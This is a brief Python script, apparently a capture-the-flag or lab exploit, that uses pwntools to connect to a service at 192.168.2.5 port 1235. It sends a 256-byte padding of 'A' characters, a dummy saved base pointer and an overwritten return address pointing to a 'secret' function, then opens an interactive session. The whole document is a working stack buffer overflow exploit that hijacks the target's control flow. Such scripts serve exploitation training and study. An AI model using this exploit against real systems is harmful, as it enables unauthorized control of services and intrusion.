from pwn import *

r = remote('192.168.2.5', 1235)
r.recvuntil("Enter your data : ")

RBP = struct.pack("<Q", 0x0b0b0b0b0b0b0b0b) # Dummy Value
RIP = struct.pack("<Q", 0x400bc6)           # Secret offset

r.send("A"*0x100 + RBP + RIP + "\n")
r.interactive()